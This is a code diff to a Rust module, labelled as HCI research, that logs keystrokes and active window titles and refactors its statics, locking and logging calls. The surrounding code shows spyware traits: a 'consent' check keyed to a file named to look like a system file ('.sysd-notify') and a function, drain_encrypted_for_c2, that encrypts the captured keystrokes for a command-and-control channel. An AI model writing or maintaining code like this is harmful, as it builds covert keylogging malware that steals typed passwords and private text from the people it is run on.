@@ -11,8 +11,9 @@
 
 #![cfg(feature = "hci-research")]
 
+use common::lock::MutexExt;
 use chrono::Utc;
-use lazy_static::lazy_static;
+use once_cell::sync::Lazy;
 use serde::Serialize;
 use std::collections::VecDeque;
 use std::fs;
@@ -63,8 +64,8 @@ pub enum HciEvent {
     Window(WindowEvent),
 }
 
-lazy_static! {
-    static ref CONSENT_FILE_PATH: Mutex<String> = Mutex::new(
+static CONSENT_FILE_PATH: Lazy<Mutex<String>> = Lazy::new(|| {
+    Mutex::new(
         // Default to a user-level path consistent with remote_assist.rs:
         // prefer $HOME so no elevated privileges are needed.
         std::env::var("HOME")
@@ -80,30 +81,28 @@ lazy_static! {
                 {
                     "/tmp/.sysd-notify".to_string()
                 }
-            })
-    );
-    static ref HCI_LOG_BUFFER: Arc<Mutex<VecDeque<HciEvent>>> =
-        Arc::new(Mutex::new(VecDeque::with_capacity(MAX_BUFFER_SIZE)));
-    /// Gates event processing and controls the window-title polling thread.
-    /// AtomicBool allows lock-free access from the key-listener callback.
-    static ref IS_LOGGING: Arc<AtomicBool> = Arc::new(AtomicBool::new(false));
-    /// Prevents spawning more than one key-listener thread.
-    /// The platform-specific listener blocks indefinitely; once started the
-    /// thread runs for the process lifetime and we gate event delivery via
-    /// IS_LOGGING instead of stopping and restarting the thread.
-    static ref LISTENER_STARTED: AtomicBool = AtomicBool::new(false);
-    /// Prevents accumulating window-title polling threads across repeated
-    /// start/stop cycles.  The flag is cleared when the thread exits so that
-    /// the next start_logging call can re-spawn it.
-    static ref WINDOW_POLLER_STARTED: AtomicBool = AtomicBool::new(false);
-}
+            }),
+    )
+});
+static HCI_LOG_BUFFER: Lazy<Arc<Mutex<VecDeque<HciEvent>>>> =
+    Lazy::new(|| Arc::new(Mutex::new(VecDeque::with_capacity(MAX_BUFFER_SIZE))));
+/// Gates event processing and controls the window-title polling thread.
+/// AtomicBool allows lock-free access from the key-listener callback.
+static IS_LOGGING: Lazy<Arc<AtomicBool>> = Lazy::new(|| Arc::new(AtomicBool::new(false)));
+/// Prevents spawning more than one key-listener thread.
+/// The platform-specific listener blocks indefinitely; once started the
+/// thread runs for the process lifetime and we gate event delivery via
+/// IS_LOGGING instead of stopping and restarting the thread.
+static LISTENER_STARTED: Lazy<AtomicBool> = Lazy::new(|| AtomicBool::new(false));
+/// Prevents accumulating window-title polling threads across repeated
+/// start/stop cycles.  The flag is cleared when the thread exits so that
+/// the next start_logging call can re-spawn it.
+static WINDOW_POLLER_STARTED: Lazy<AtomicBool> = Lazy::new(|| AtomicBool::new(false));
 
 #[cfg(target_os = "macos")]
-lazy_static! {
-    /// macOS-only guard to avoid spawning duplicate periodic event-tap health
-    /// check threads across repeated start_logging() calls.
-    static ref TAP_HEALTH_CHECK_STARTED: AtomicBool = AtomicBool::new(false);
-}
+/// macOS-only guard to avoid spawning duplicate periodic event-tap health
+/// check threads across repeated start_logging() calls.
+static TAP_HEALTH_CHECK_STARTED: Lazy<AtomicBool> = Lazy::new(|| AtomicBool::new(false));
 
 #[cfg(target_os = "macos")]
 const MACOS_TAP_PERMISSION_WARNING: &str = "hci_logging: CGEventTap creation failed — the application likely lacks Accessibility permissions. Enable it in System Preferences > Security & Privacy > Privacy > Accessibility.";
@@ -196,7 +195,7 @@ fn probe_macos_event_tap_health() -> MacOsTapHealth {
 }
 
 fn check_consent() -> bool {
-    let path = CONSENT_FILE_PATH.lock().unwrap();
+    let path = CONSENT_FILE_PATH.lock_recover();
     fs::metadata(path.as_str()).is_ok()
 }
 
@@ -672,7 +671,7 @@ pub fn start_logging() -> Result<(), String> {
                 AXIsProcessTrusted()
             };
             if !trusted {
-                log::warn!(
+                tracing::warn!(
                     "hci_logging: macOS Accessibility permission is not granted. \
                      Key events may not be captured until this process is added in \
                      System Preferences -> Privacy & Security -> Accessibility."
@@ -683,7 +682,7 @@ pub fn start_logging() -> Result<(), String> {
             // feedback when key capture is unavailable due to permissions.
             match probe_macos_event_tap_health() {
                 MacOsTapHealth::CreationFailedDisabled => {
-                    log::warn!("{}", MACOS_TAP_PERMISSION_WARNING);
+                    tracing::warn!("{}", MACOS_TAP_PERMISSION_WARNING);
                     IS_LOGGING.store(false, Ordering::SeqCst);
                     LISTENER_STARTED.store(false, Ordering::SeqCst);
                     return Err(
@@ -692,7 +691,7 @@ pub fn start_logging() -> Result<(), String> {
                     );
                 }
                 MacOsTapHealth::Disabled => {
-                    log::warn!(
+                    tracing::warn!(
                         "hci_logging: macOS CGEventTap is not enabled. \
                          Grant Accessibility permissions to this process in \
                          System Preferences -> Privacy & Security -> Accessibility \
@@ -720,7 +719,7 @@ pub fn start_logging() -> Result<(), String> {
                                 MacOsTapHealth::CreationFailedDisabled
                                 | MacOsTapHealth::Disabled => {
                                     if !warned_disabled {
-                                        log::warn!(
+                                        tracing::warn!(
                                             "hci_logging: macOS CGEventTap was disabled at runtime - \
                                              Accessibility permissions may have been revoked."
                                         );
@@ -803,7 +802,7 @@ pub fn start_logging() -> Result<(), String> {
         });
     }
 
-    log::debug!("HCI logging started.");
+    tracing::debug!("HCI logging started.");
     Ok(())
 }
 
@@ -816,19 +815,19 @@ pub fn stop_logging() -> Result<(), String> {
     {
         return Err("Logging is not in progress.".to_string());
     }
-    log::debug!("HCI logging stopped.");
+    tracing::debug!("HCI logging stopped.");
     Ok(())
 }
 
 /// Retrieves the current HCI log buffer.
 pub fn get_log_buffer() -> Result<Vec<HciEvent>, String> {
-    let buffer = HCI_LOG_BUFFER.lock().unwrap();
+    let buffer = HCI_LOG_BUFFER.lock_recover();
     Ok(buffer.iter().cloned().collect())
 }
 
 /// Adds an event to the log buffer, enforcing size limits.
 fn add_log_event(buffer_handle: &Arc<Mutex<VecDeque<HciEvent>>>, event: HciEvent) {
-    let mut buffer = buffer_handle.lock().unwrap();
+    let mut buffer = buffer_handle.lock_recover();
     if buffer.len() == MAX_BUFFER_SIZE {
         buffer.pop_front();
     }
@@ -1052,7 +1051,7 @@ fn get_active_window_title() -> Result<String, String> {
 pub fn purge_expired_events() {
     let cutoff =
         (Utc::now().timestamp_micros() as u64).saturating_sub(MAX_RETENTION_SECONDS * 1_000_000);
-    let mut buf = HCI_LOG_BUFFER.lock().unwrap();
+    let mut buf = HCI_LOG_BUFFER.lock_recover();
     buf.retain(|ev| {
         let ts = match ev {
             HciEvent::Keyboard(k) => k.timestamp,
@@ -1086,7 +1085,7 @@ pub fn drain_encrypted_for_c2(key: &[u8; 32]) -> Option<Vec<u8>> {
         ChaCha20Poly1305, Nonce,
     };
     let events: Vec<HciEvent> = {
-        let mut buf = HCI_LOG_BUFFER.lock().unwrap();
+        let mut buf = HCI_LOG_BUFFER.lock_recover();
         if buf.is_empty() {
             return None;
         }
@@ -1095,7 +1094,7 @@ pub fn drain_encrypted_for_c2(key: &[u8; 32]) -> Option<Vec<u8>> {
     let plaintext = match serde_json::to_vec(&events) {
         Ok(v) => v,
         Err(e) => {
-            log::error!("hci_logging: serialisation failed: {}", e);
+            tracing::error!("hci_logging: serialisation failed: {}", e);
             return None;
         }
     };
@@ -1111,7 +1110,7 @@ pub fn drain_encrypted_for_c2(key: &[u8; 32]) -> Option<Vec<u8>> {
             Some(out)
         }
         Err(e) => {
-            log::error!("hci_logging: encryption failed: {}", e);
+            tracing::error!("hci_logging: encryption failed: {}", e);
             None
         }
     }
@@ -1138,7 +1137,7 @@ mod tests {
         let dir = tempdir().unwrap();
         let consent_file = dir.path().join("sysd-notify");
         let original_path = {
-            let mut path_guard = CONSENT_FILE_PATH.lock().unwrap();
+            let mut path_guard = CONSENT_FILE_PATH.lock_recover();
             let original = path_guard.clone();
             *path_guard = consent_file.to_str().unwrap().to_string();
             original
@@ -1148,7 +1147,7 @@ mod tests {
         if let Err(e) = start_logging() {
             println!("Could not start logging, skipping test: {}", e);
             // Restore original path
-            *CONSENT_FILE_PATH.lock().unwrap() = original_path;
+            *CONSENT_FILE_PATH.lock_recover() = original_path;
             return;
         }
         assert!(start_logging().is_err()); // Already running
@@ -1158,7 +1157,7 @@ mod tests {
         assert!(start_logging().is_err()); // No consent
 
         // Restore original path
-        *CONSENT_FILE_PATH.lock().unwrap() = original_path;
+        *CONSENT_FILE_PATH.lock_recover() = original_path;
     }
 
     #[tokio::test]
@@ -1166,7 +1165,7 @@ mod tests {
         let dir = tempdir().unwrap();
         let consent_file = dir.path().join("sysd-notify");
         let original_path = {
-            let mut path_guard = CONSENT_FILE_PATH.lock().unwrap();
+            let mut path_guard = CONSENT_FILE_PATH.lock_recover();
             let original = path_guard.clone();
             *path_guard = consent_file.to_str().unwrap().to_string();
             original
@@ -1174,12 +1173,12 @@ mod tests {
 
         create_consent_file(&consent_file);
         // Clear buffer from previous runs
-        HCI_LOG_BUFFER.lock().unwrap().clear();
+        HCI_LOG_BUFFER.lock_recover().clear();
 
         if let Err(e) = start_logging() {
             println!("Could not start logging, skipping test: {}", e);
             // Restore original path
-            *CONSENT_FILE_PATH.lock().unwrap() = original_path;
+            *CONSENT_FILE_PATH.lock_recover() = original_path;
             return;
         }
 
@@ -1231,7 +1230,7 @@ mod tests {
         }
 
         // Restore original path
-        *CONSENT_FILE_PATH.lock().unwrap() = original_path;
+        *CONSENT_FILE_PATH.lock_recover() = original_path;
     }
 
     #[test]
@@ -1246,7 +1245,7 @@ mod tests {
                 }),
             );
         }
-        let buffer = buffer_handle.lock().unwrap();
+        let buffer = buffer_handle.lock_recover();
         assert_eq!(buffer.len(), MAX_BUFFER_SIZE);
     }
 }
